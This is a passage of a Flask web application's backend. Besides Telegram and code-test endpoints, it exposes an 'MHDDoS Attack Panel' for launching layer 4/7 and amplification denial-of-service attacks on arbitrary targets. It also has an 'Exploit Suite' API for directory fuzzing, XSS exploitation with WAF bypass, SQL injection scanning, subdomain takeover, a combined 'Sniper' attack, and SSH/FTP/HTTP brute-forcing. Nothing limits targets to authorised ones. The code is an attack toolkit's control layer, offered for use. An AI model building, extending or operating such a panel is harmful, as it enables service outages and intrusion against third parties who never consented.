        from modules import scan_school
        query = request.args.get("q", "").strip()
        result = scan_school.run(query)
        return jsonify(result["data"])
    except ImportError:
        return jsonify({"error": "school_module_unavailable"}), 503


# ═══════════════════════════════════════════════════════════════════════════
# Telegram
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/telegram/status")
@api_login_required
def api_telegram_status():
    return jsonify(get_bot_status())


@app.route("/api/telegram/connect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_connect():
    data = _json_body()
    token = (data.get("token") or "").strip()
    username = (data.get("username") or "").strip()
    owner_id = (data.get("owner_id") or "").strip()
    public_mode = data.get("public_mode", True)
    if not token or not username:
        return jsonify({"error": "token_and_username_required"}), 400
    success, message = connect_bot(token, username, owner_id, public_mode)
    if not success:
        return jsonify({"error": message}), 500
    return jsonify(get_bot_status())


@app.route("/api/telegram/disconnect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_disconnect():
    disconnect_bot()
    return jsonify({"status": "disconnected"})


@app.route("/api/telegram/update-settings", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_update_settings():
    data = _json_body()
    settings: Dict[str, Any] = {}
    if "owner_id" in data:
        settings["owner_id"] = str(data["owner_id"]).strip()
    if "public_mode" in data:
        settings["public_mode"] = bool(data["public_mode"])
    if not settings:
        return jsonify({"error": "no_settings_provided"}), 400
    return jsonify(update_bot_settings(**settings))


@app.route("/api/telegram/broadcast", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_broadcast():
    data = _json_body()
    message = (data.get("message") or "").strip()
    if not message:
        return jsonify({"error": "message_required"}), 400
    return jsonify(broadcast_message(message))


# ═══════════════════════════════════════════════════════════════════════════
# Code Test workspace
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/code_test/read")
@api_login_required
def api_read_file():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    file_path = request.args.get("path", "").strip()
    if not file_path:
        return jsonify({"error": "path required"}), 400
    return jsonify(code_test_module.read_file(file_path))


@app.route("/api/code_test/write", methods=["POST"])
@api_login_required
def api_write_file():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    data = _json_body()
    file_path = (data.get("file_path") or "").strip()
    content = data.get("content", "")
    if not file_path:
        return jsonify({"error": "file_path required"}), 400
    return jsonify(code_test_module.write_file(file_path, content))


@app.route("/api/code_test/run", methods=["POST"])
@api_login_required
def api_run_code_test():
    if not _testing_available:
        return jsonify({"error": "Testing module is not installed"}), 503
    data = _json_body()
    code = data.get("code", "")
    if not code:
        return jsonify({"error": "No code provided"}), 400
    try:
        results = code_test_module.run_tests(code, data.get("test_cases", []))
        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": f"Execution error: {e}"}), 500


@app.route("/api/code_test/files")
@api_login_required
def api_list_code_test_files():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    try:
        return jsonify({"files": code_test_module.list_project_files()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/code_test/backup", methods=["POST"])
@api_login_required
def api_backup_file():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    data = _json_body()
    file_path = data.get("file_path")
    if not file_path:
        return jsonify({"error": "file_path required"}), 400
    return jsonify(code_test_module.backup_file(file_path))


@app.route("/api/code_test/backup_all", methods=["POST"])
@api_login_required
def api_backup_all():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    return jsonify(code_test_module.backup_all_source_files())


@app.route("/api/code_test/workspace_info")
@api_login_required
def api_workspace_info():
    if not _testing_available:
        return jsonify({"error": "Testing module not available"}), 503
    return jsonify(code_test_module.get_workspace_info())


@app.route("/api/code_test/scan", methods=["POST"])
@api_login_required
def api_code_test_scan():
    data = _json_body()
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    tools = data.get("tools", [])
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    return jsonify({"job_id": scan_orchestrator.start_scan(
        target, mode, tools, history_store)})


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS Attack Panel
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/mhddos/methods")
@login_required
def mhddos_methods():
    return jsonify({
        "available": True,
        "methods": sorted(_MHDDOS_METHODS),
        "layer7": sorted(_MHDDOS_LAYER7),
        "layer4": sorted(_MHDDOS_LAYER4),
        "amplification": sorted(_MHDDOS_AMP),
        "proxy_files": sorted(ALLOWED_PROXY_FILES),
        "reflector_files": sorted(ALLOWED_REFLECTOR_FILES),
    })


@app.route("/api/mhddos/start", methods=["POST"])
@login_required
def mhddos_start():
    data = _json_body()
    method = (data.get("method") or "").strip().upper()
    target = (data.get("target") or "").strip()
    try:
        threads = int(data.get("threads", 10))
        duration = int(data.get("duration", 60))
        proxy_type = int(data.get("proxy_type", 0))
        rpc = int(data.get("rpc", 1))
    except (TypeError, ValueError):
        return jsonify({"error": "invalid numeric parameter"}), 400
    proxy_file = Path((data.get("proxy_file") or "proxies.txt").strip()).name
    reflector_file = Path((data.get("reflector_file") or "").strip()).name
    debug = bool(data.get("debug", False))

    if not method or not target:
        return jsonify({"error": "method and target are required"}), 400
    if method not in _MHDDOS_METHODS:
        return jsonify({"error": f"Unknown method: {method}"}), 400
    if threads < 1 or threads > 1000:
        return jsonify({"error": "threads must be between 1 and 1000"}), 400
    if duration < 1 or duration > 3600:
        return jsonify({"error": "duration must be between 1 and 3600 seconds"}), 400
    if proxy_type not in VALID_PROXY_TYPES:
        return jsonify({"error": "invalid proxy_type",
                        "allowed": sorted(VALID_PROXY_TYPES)}), 400
    if method not in _MHDDOS_AMP and proxy_file not in ALLOWED_PROXY_FILES:
        return jsonify({"error": "invalid proxy_file",
                        "allowed": sorted(ALLOWED_PROXY_FILES)}), 400
    if method in _MHDDOS_AMP and reflector_file \
            and reflector_file not in ALLOWED_REFLECTOR_FILES:
        return jsonify({"error": "invalid reflector_file",
                        "allowed": sorted(ALLOWED_REFLECTOR_FILES)}), 400
    if method in _MHDDOS_LAYER7:
        missing = [str(p) for p in REQUIRED_L7_FILES
                   if not (Path(PROJECT_ROOT) / p).exists()]
        if missing:
            return jsonify({
                "error": "engine_missing_files",
                "detail": f"start.py requires these files for L7: {', '.join(missing)}",
            }), 500

    attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
    result = _mhddos_start_attack(
        attack_id, method, target, threads, duration,
        proxy_type, proxy_file, rpc, reflector_file, debug,
    )
    return jsonify(result), (201 if result.get("success") else 500)


@app.route("/api/mhddos/stop", methods=["POST"])
@login_required
def mhddos_stop():
    data = _json_body()
    attack_id = (data.get("attack_id") or "").strip()
    if not attack_id:
        return jsonify({"error": "attack_id required"}), 400
    result = _mhddos_stop_attack(attack_id)
    return jsonify(result), (200 if result.get("success") else 404)


@app.route("/api/mhddos/stop_all", methods=["POST"])
@login_required
def mhddos_stop_all():
    return jsonify(_mhddos_stop_all())


@app.route("/api/mhddos/status")
@login_required
def mhddos_status():
    attack_id = request.args.get("attack_id", "").strip()
    status = _mhddos_get_status(attack_id or None)
    if attack_id and status is None:
        return jsonify({"error": "Attack not found"}), 404
    return jsonify(status)


@app.route("/api/mhddos/history")
@login_required
def mhddos_history():
    limit = min(request.args.get("limit", 50, type=int), 200)
    with _mhddos_lock:
        snapshot = list(_mhddos_history[-limit:])
    return jsonify({"history": [_serialise_mhddos_entry(h) for h in snapshot]})


@app.route("/api/mhddos/log/<attack_id>")
@login_required
def mhddos_log(attack_id):
    attack_id = attack_id.strip()
    if not re.match(r"^MHD-[A-Z0-9]{8}$", attack_id):
        return jsonify({"error": "invalid attack_id"}), 400
    with _mhddos_lock:
        entry = _mhddos_processes.get(attack_id)
    log_path = None
    if entry and entry.get("log_path"):
        log_path = entry["log_path"]
    else:
        candidate = MHDDOS_LOG_DIR / f"{attack_id}.log"
        if candidate.exists():
            log_path = str(candidate)
    if not log_path or not Path(log_path).exists():
        return jsonify({"error": "log_not_found", "attack_id": attack_id}), 404
    lines = min(int(request.args.get("lines", 200)), 2000)
    return jsonify({
        "attack_id": attack_id,
        "log_path": log_path,
        "lines": _mhddos_read_log_tail(log_path, lines).splitlines(),
    })


@app.route("/api/mhddos/command", methods=["POST"])
@login_required
def mhddos_preview_command():
    data = _json_body()
    method = (data.get("method") or "").strip().upper()
    target = (data.get("target") or "").strip()
    if method not in _MHDDOS_METHODS or not target:
        return jsonify({"error": "valid method and target required"}), 400
    try:
        cmd = _mhddos_build_command(
            method=method,
            target=target,
            threads=int(data.get("threads", 10)),
            duration=int(data.get("duration", 60)),
            proxy_type=int(data.get("proxy_type", 0)),
            proxy_file=(data.get("proxy_file") or "proxies.txt"),
            rpc=int(data.get("rpc", 1)),
            reflector_file=(data.get("reflector_file") or ""),
            debug=bool(data.get("debug", False)),
        )
    except (TypeError, ValueError) as e:
        return jsonify({"error": f"invalid parameter: {e}"}), 400
    layer = "L7" if method in _MHDDOS_LAYER7 else "L4"
    return jsonify({
        "layer": layer,
        "amplification": method in _MHDDOS_AMP,
        "argv": cmd,
        "argv_after_script": cmd[2:],
    })


# ═══════════════════════════════════════════════════════════════════════════
# EXPLOIT SUITE — Wordlists
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/wordlists")
@login_required
def api_exploit_wordlists():
    if _dirfuzz_available and dirfuzz_module is not None:
        return jsonify({
            "directory": str(dirfuzz_module.WORDLIST_DIR),
            "wordlists": dirfuzz_module.list_wordlists(),
        })
    return jsonify({"directory": str(WORDLIST_DIR), "wordlists": []})


# ═══════════════════════════════════════════════════════════════════════════
# DIRFUZZ
# ═══════════════════════════════════════════════════════════════════════════
def _dirfuzz_normalise(body: Dict[str, Any]) -> Dict[str, Any]:
    def _i(key, default, lo, hi):
        try:
            return max(lo, min(hi, int(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _f(key, default, lo, hi):
        try:
            return max(lo, min(hi, float(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _b(key, default):
        v = body.get(key, default)
        return bool(v) if v is not None else default

    return {
        "wordlist_name":    (body.get("wordlist_name") or "lottery-dirs.txt").strip(),
        "wordlist":         body.get("wordlist") or None,
        "max_paths":        _i("max_paths", 300, 10, 2000),
        "concurrency":      _i("concurrency", 24, 1, 64),
        "rate_limit":       _f("rate_limit", 40.0, 1.0, 200.0),
        "timeout":          _f("timeout", 4.0, 1.0, 15.0),
        "max_duration":     _f("max_duration", 90.0, 10.0, 300.0),
        "follow_redirects": _b("follow_redirects", False),
    }


@app.route("/api/exploit/dirfuzz/start", methods=["POST"])
@login_required
def api_exploit_dirfuzz_start():
    if not _dirfuzz_available or dirfuzz_module is None:
        return jsonify({"error": "dirfuzz module not available"}), 503
    body = _json_body()
    base = (body.get("base") or body.get("url") or "").strip()
    if not base:
        return jsonify({"error": "base URL required"}), 400
    if not job_manager.can_start("dirfuzz"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager._max_per_kind}), 429

    job_id = job_manager.new_id("DRF")
    options = _dirfuzz_normalise(body)
    job = _Job(job_id, "dirfuzz", base, options)
    job_manager.register(job)

    def _progress(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            result = dirfuzz_module.run(base, {**options,
                                                "cancel_event": job.cancel,
                                                "progress_cb": _progress})
            job_manager.finish(job_id, results=result)
        except Exception as e:
            logger.exception("Dirfuzz job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"drf-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": options}), 202


@app.route("/api/exploit/dirfuzz/status/<job_id>")
@login_required
def api_exploit_dirfuzz_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "dirfuzz":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/dirfuzz/cancel/<job_id>", methods=["POST"])
@login_required
def api_exploit_dirfuzz_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "dirfuzz":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/dirfuzz/wordlists")
@login_required
def api_exploit_dirfuzz_wordlists():
    if not _dirfuzz_available or dirfuzz_module is None:
        return jsonify({"error": "dirfuzz module not available"}), 503
    return jsonify({
        "wordlists": dirfuzz_module.list_wordlists(),
        "sources":   getattr(dirfuzz_module, "WORDLIST_SOURCES", {}),
    })


@app.route("/api/exploit/dirfuzz/stream", methods=["POST"])
@login_required
def api_exploit_dirfuzz_stream():
    if not _dirfuzz_available or dirfuzz_module is None:
        return jsonify({"error": "dirfuzz module not available"}), 503
    body = _json_body()
    base = (body.get("base") or body.get("url") or "").strip()
    if not base:
        return jsonify({"error": "base URL required"}), 400
    options = _dirfuzz_normalise(body)
    return sse_response(dirfuzz_module.run_streaming(base, options))


# ═══════════════════════════════════════════════════════════════════════════
# XSS
# ═══════════════════════════════════════════════════════════════════════════
def _xss_normalise(body: Dict[str, Any]) -> Dict[str, Any]:
    def _i(key, default, lo, hi):
        try:
            return max(lo, min(hi, int(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _f(key, default, lo, hi):
        try:
            return max(lo, min(hi, float(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _b(key, default):
        v = body.get(key, default)
        return bool(v) if v is not None else default

    return {
        "max_payloads": _i("max_payloads", 20, 5, 120),
        "max_params":   _i("max_params", 8, 3, 40),
        "concurrency":  _i("concurrency", 8, 1, 32),
        "rate_limit":   _f("rate_limit", 25.0, 1.0, 100.0),
        "timeout":      _f("timeout", 8.0, 2.0, 20.0),
        "waf_bypass":   _b("waf_bypass", False),
        "params":       body.get("params") or None,
        "method":       (body.get("method") or "GET").upper(),
        "max_duration": _f("max_duration", 60.0, 10.0, 180.0),
    }


@app.route("/api/exploit/xss/start", methods=["POST"])
@login_required
def api_exploit_xss_start():
    if not _xss_available or xss_module is None:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    body = _json_body()
    url = (body.get("url") or "").strip()
    if not url:
        return jsonify({"error": "URL required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if not job_manager.can_start("xss"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager._max_per_kind}), 429

    job_id = job_manager.new_id("XSS")
    options = _xss_normalise(body)
    job = _Job(job_id, "xss", url, options)
    job_manager.register(job)

    def _progress(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            result = xss_module.run(url, {**options,
                                           "cancel_event": job.cancel,
                                           "progress_cb": _progress})
            job_manager.finish(job_id, results=result)
        except Exception as e:
            logger.exception("XSS job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"xss-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": options}), 202


@app.route("/api/exploit/xss/status/<job_id>")
@login_required
def api_exploit_xss_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "xss":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/xss/cancel/<job_id>", methods=["POST"])
@login_required
def api_exploit_xss_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "xss":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/xss/jobs")
@login_required
def api_exploit_xss_jobs():
    jobs = [j.to_public() for j in job_manager.list_by_kind("xss")]
    return jsonify({"jobs": jobs})


@app.route("/api/exploit/xss/stream", methods=["POST"])
@login_required
def api_exploit_xss_stream():
    if not _xss_available or xss_module is None:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    if not hasattr(xss_module, "run_streaming"):
        return jsonify({"error": "stream not supported by this module version"}), 501
    body = _json_body()
    url = (body.get("url") or "").strip()
    if not url:
        return jsonify({"error": "URL required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    options = _xss_normalise(body)
    return sse_response(xss_module.run_streaming(url, options))


@app.route("/api/exploit/xss", methods=["POST"])
@login_required
def api_exploit_xss_legacy():
    if not _xss_available or xss_module is None:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    data = _json_body()
    url = (data.get("url") or "").strip()
    if not url:
        return jsonify({"error": "URL required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        result = xss_module.run(url, _xss_normalise(data))
        return jsonify({"results": result})
    except Exception as e:
        logger.exception("XSS scan failed")
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


@app.route("/api/exploit/xss/wordlist")
@login_required
def api_exploit_xss_wordlist():
    if not _xss_available:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    try:
        return jsonify(xss_module.ensure_wordlist())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/xss/wordlist/preview")
@login_required
def api_exploit_xss_wordlist_preview():
    if not _xss_available:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    limit = min(int(request.args.get("lines", 50)), 500)
    try:
        payloads = xss_module.load_wordlist()
        return jsonify({"count": len(payloads), "lines": payloads[:limit]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/xss/wordlist/refresh", methods=["POST"])
@login_required
def api_exploit_xss_wordlist_refresh():
    if not _xss_available:
        return jsonify({"error": "xss_exploiter module not available"}), 503
    try:
        payloads = xss_module.load_wordlist(force_download=True)
        return jsonify({
            "success": True,
            "count": len(payloads),
            "path": str(xss_module.WORDLIST_DIR / xss_module.XSS_WORDLIST_NAME),
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# SQL Injection
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/sql_inject", methods=["POST"])
@login_required
def api_exploit_sql_inject():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = _json_body()
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "URL required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_sql_injection_scan(
            url, data.get("method", "GET"), data.get("params"))})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Subdomain Takeover
# ═══════════════════════════════════════════════════════════════════════════
def _takeover_normalise(body: Dict[str, Any]) -> Dict[str, Any]:
    def _i(key, default, lo, hi):
        try:
            return max(lo, min(hi, int(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _f(key, default, lo, hi):
        try:
            return max(lo, min(hi, float(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _b(key, default):
        v = body.get(key, default)
        return bool(v) if v is not None else default

    return {
        "enumerate":    _b("enumerate", True),
        "use_crtsh":    _b("use_crtsh", True),
        "use_wordlist": _b("use_wordlist", True),
        "concurrency":  _i("concurrency", 24, 1, 64),
        "max_hosts":    _i("max_hosts", 150, 10, 500),
        "http_timeout": _f("http_timeout", 5.0, 1.0, 15.0),
        "dns_timeout":  _f("dns_timeout", 2.5, 0.5, 10.0),
        "rate_limit":   _f("rate_limit", 25.0, 1.0, 100.0),
        "max_duration": _f("max_duration", 90.0, 10.0, 300.0),
    }


@app.route("/api/exploit/takeover/start", methods=["POST"])
@login_required
def api_exploit_takeover_start():
    if not _takeover_available or takeover_module is None:
        return jsonify({"error": "subdomain_takeover module not available"}), 503
    body = _json_body()
    domain = (body.get("domain") or "").strip().lower()
    if not domain:
        return jsonify({"error": "domain required"}), 400
    if not re.match(
        r"^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?"
        r"(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$",
        domain,
    ):
        return jsonify({"error": "invalid domain format"}), 400
    if not job_manager.can_start("takeover"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager._max_per_kind}), 429

    job_id = job_manager.new_id("TKO")
    options = _takeover_normalise(body)
    job = _Job(job_id, "takeover", domain, options)
    job_manager.register(job)

    def _progress(done, total, label):
        job_manager.update_progress(job_id, done, total, label)

    def _worker():
        try:
            result = takeover_module.run(domain, {**options,
                                                    "cancel_event": job.cancel,
                                                    "progress_cb": _progress})
            job_manager.finish(job_id, results=result)
        except Exception as e:
            logger.exception("Takeover job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"tk-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": options}), 202


@app.route("/api/exploit/takeover/status/<job_id>")
@login_required
def api_exploit_takeover_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "takeover":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/takeover/cancel/<job_id>", methods=["POST"])
@login_required
def api_exploit_takeover_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "takeover":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/takeover/jobs")
@login_required
def api_exploit_takeover_jobs():
    jobs = [j.to_public() for j in job_manager.list_by_kind("takeover")]
    return jsonify({"jobs": jobs})


@app.route("/api/exploit/takeover/stream", methods=["POST"])
@login_required
def api_exploit_takeover_stream():
    if not _takeover_available or takeover_module is None:
        return jsonify({"error": "subdomain_takeover module not available"}), 503
    if not hasattr(takeover_module, "run_streaming"):
        return jsonify({"error": "stream not supported by this module version"}), 501
    body = _json_body()
    domain = (body.get("domain") or "").strip().lower()
    if not domain:
        return jsonify({"error": "domain required"}), 400
    options = _takeover_normalise(body)
    return sse_response(takeover_module.run_streaming(domain, options))


@app.route("/api/exploit/takeover", methods=["POST"])
@login_required
def api_exploit_takeover_legacy():
    if not _takeover_available or takeover_module is None:
        return jsonify({"error": "subdomain_takeover module not available"}), 503
    body = _json_body()
    domain = (body.get("domain") or "").strip().lower()
    if not domain:
        return jsonify({"error": "domain required"}), 400
    try:
        return jsonify(takeover_module.run(domain, _takeover_normalise(body)))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.exception("Subdomain takeover scan failed")
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Sniper
# ═══════════════════════════════════════════════════════════════════════════
def _sniper_normalise(body: Dict[str, Any]) -> Dict[str, Any]:
    def _i(key, default, lo, hi):
        try:
            return max(lo, min(hi, int(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _f(key, default, lo, hi):
        try:
            return max(lo, min(hi, float(body.get(key, default))))
        except (TypeError, ValueError):
            return default

    def _b(key, default):
        v = body.get(key, default)
        return bool(v) if v is not None else default

    return {
        "module_timeout": _f("module_timeout", 90.0, 15.0, 300.0),
        "global_budget":  _f("global_budget", 150.0, 20.0, 600.0),

        "dirfuzz_wordlist":     (body.get("dirfuzz_wordlist") or "lottery-dirs.txt").strip(),
        "dirfuzz_max_paths":    _i("dirfuzz_max_paths", 80, 10, 500),
        "dirfuzz_concurrency":  _i("dirfuzz_concurrency", 24, 1, 64),
        "dirfuzz_rate_limit":   _f("dirfuzz_rate_limit", 40.0, 1.0, 200.0),
        "dirfuzz_timeout":      _f("dirfuzz_timeout", 4.0, 1.0, 15.0),
        "dirfuzz_max_duration": _f("dirfuzz_max_duration", 60.0, 10.0, 180.0),

        "xss_max_payloads": _i("xss_max_payloads", 20, 5, 120),
        "xss_max_params":   _i("xss_max_params", 8, 3, 40),
        "xss_concurrency":  _i("xss_concurrency", 8, 1, 32),
        "xss_rate_limit":   _f("xss_rate_limit", 25.0, 1.0, 100.0),
        "xss_timeout":      _f("xss_timeout", 8.0, 2.0, 20.0),
        "xss_waf_bypass":   _b("xss_waf_bypass", False),
        "xss_max_duration": _f("xss_max_duration", 60.0, 10.0, 180.0),

        "takeover_enumerate":    _b("takeover_enumerate", True),
        "takeover_crtsh":        _b("takeover_crtsh", True),
        "takeover_wordlist":     _b("takeover_wordlist", True),
        "takeover_concurrency":  _i("takeover_concurrency", 24, 1, 100),
        "takeover_max_hosts":    _i("takeover_max_hosts", 120, 10, 500),
        "takeover_rate_limit":   _f("takeover_rate_limit", 25.0, 1.0, 100.0),
        "takeover_http_timeout": _f("takeover_http_timeout", 5.0, 2.0, 20.0),
        "takeover_dns_timeout":  _f("takeover_dns_timeout", 2.5, 0.5, 10.0),
        "takeover_max_duration": _f("takeover_max_duration", 75.0, 10.0, 180.0),
    }


@app.route("/api/exploit/sniper/start", methods=["POST"])
@login_required
def api_exploit_sniper_start():
    if not _sniper_available or sniper_module is None:
        return jsonify({"error": "sniper module not available"}), 503
    body = _json_body()
    target = (body.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    if not re.match(
        r"^(https?://)?[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?"
        r"(\.[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*"
        r"(:\d{1,5})?(/[^\s]*)?$",
        target,
    ):
        return jsonify({"error": "invalid target format"}), 400
    if not job_manager.can_start("sniper"):
        return jsonify({"error": "too_many_active_jobs",
                        "limit": job_manager._max_per_kind}), 429

    job_id = job_manager.new_id("SNP")
    options = _sniper_normalise(body)
    job = _Job(job_id, "sniper", target, options)
    job_manager.register(job)

    def _worker():
        try:
            result = sniper_module.run(target, {**options,
                                                 "cancel_event": job.cancel})
            job_manager.finish(job_id, results=result)
        except Exception as e:
            logger.exception("Sniper job %s failed", job_id)
            job_manager.finish(job_id, error=str(e))

    threading.Thread(target=_worker, daemon=True,
                     name=f"snp-{job_id}").start()
    return jsonify({"job_id": job_id, "status": "running",
                    "options": options}), 202


@app.route("/api/exploit/sniper/status/<job_id>")
@login_required
def api_exploit_sniper_status(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "sniper":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job.to_public(include_results=True))


@app.route("/api/exploit/sniper/cancel/<job_id>", methods=["POST"])
@login_required
def api_exploit_sniper_cancel(job_id):
    job = job_manager.get(job_id)
    if not job or job.kind != "sniper":
        return jsonify({"error": "not_found"}), 404
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/exploit/sniper/jobs")
@login_required
def api_exploit_sniper_jobs():
    jobs = [j.to_public() for j in job_manager.list_by_kind("sniper")]
    return jsonify({"jobs": jobs})


@app.route("/api/exploit/sniper/stream", methods=["POST"])
@login_required
def api_exploit_sniper_stream():
    if not _sniper_available or sniper_module is None:
        return jsonify({"error": "sniper module not available"}), 503
    body = _json_body()
    target = (body.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    options = _sniper_normalise(body)
    return sse_response(sniper_module.run_streaming(target, options))


@app.route("/api/exploit/sniper", methods=["POST"])
@login_required
def api_exploit_sniper_legacy():
    if not _sniper_available or sniper_module is None:
        return jsonify({"error": "sniper module not available"}), 503
    body = _json_body()
    target = (body.get("target") or "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    try:
        report = sniper_module.run(target, _sniper_normalise(body))
        return jsonify(report)
    except Exception as e:
        logger.exception("Sniper scan failed")
        return jsonify({"error": "scan_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# Exploit search / stats / brute-force
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/stats")
@login_required
def api_exploit_stats():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    try:
        return jsonify(AnalyticDataManager().get_statistics())
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/list")
@login_required
def api_exploit_list():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    try:
        return jsonify({"exploits": AnalyticDataManager().list_exploits(
            category=request.args.get("category"),
            service=request.args.get("service"),
        )})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/search", methods=["POST"])
@login_required
def api_exploit_search():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = _json_body()
    query = data.get("query", "")
    if not query:
        return jsonify({"error": "Query required"}), 400
    try:
        return jsonify({"exploits": AnalyticDataManager().search_exploits(query)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/bruteforce", methods=["POST"])
@login_required
def api_exploit_bruteforce():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    data = _json_body()
    target = (data.get("target") or "").strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_brute_force(
            target,
            data.get("protocols", ["http", "ftp", "ssh"]),
            data.get("username_file", "data1.txt"),
            data.get("password_file", "data1.txt"),
        )})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/exploit/bruteforce/stop", methods=["POST"])
@login_required
def api_exploit_bruteforce_stop():
    if not _analytic_available:
        return jsonify({"error": "Analytic data module not available"}), 503
    try:
        AnalyticDataManager().stop_brute_force()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# HTTP Request Logger API
# ═══════════════════════════════════════════════════════════════════════════
def _require_http_logger():
    if http_logger is None:
        return jsonify({"error": "http_logger module not available"}), 503
    return None


@app.route("/api/logger/requests")
@login_required
def api_logger_list():
    guard = _require_http_logger()
    if guard:
        return guard
    try:
        page = int(request.args.get("page", 1))
        size = int(request.args.get("size", 100))
        status_min = request.args.get("status_min", type=int)
        status_max = request.args.get("status_max", type=int)
        since_ms = request.args.get("since_ms", type=int)
    except (TypeError, ValueError):
        return jsonify({"error": "invalid query parameters"}), 400
    return jsonify(http_logger.list(
        page=page, size=size,
        q=request.args.get("q"),
